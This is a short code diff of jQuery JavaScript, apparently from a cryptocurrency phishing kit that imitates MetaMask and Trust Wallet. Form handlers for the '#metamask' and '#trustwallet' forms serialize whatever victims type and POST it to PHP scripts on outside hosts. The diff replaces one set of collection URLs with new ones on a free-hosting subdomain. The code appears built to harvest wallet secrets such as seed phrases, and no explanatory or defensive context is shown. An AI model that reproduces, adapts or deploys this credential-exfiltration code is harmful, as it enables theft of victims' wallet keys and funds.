@@ -30,7 +30,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
  $("#metamask").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: 'https://torpedo-mashee.my.id/cuan/jembut.php',
+            url: 'https://ohacsiesbf12.000webhostapp.com/kont.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
@@ -49,7 +49,7 @@ $('#rewards2 .confirm-approve-content__small-text > button').on('click', functio
     $("#trustwallet").on("submit", "#metamask", function(e) {
         e.preventDefault();
         $.ajax({
-            url: 'https://torpedo-mashee.my.id/cuan/bulu.php',
+            url: 'https://ohacsiesbf12.000webhostapp.com/kont0.php',
             type: 'post',
             data: $(this).serialize(),
             success: function(data) {
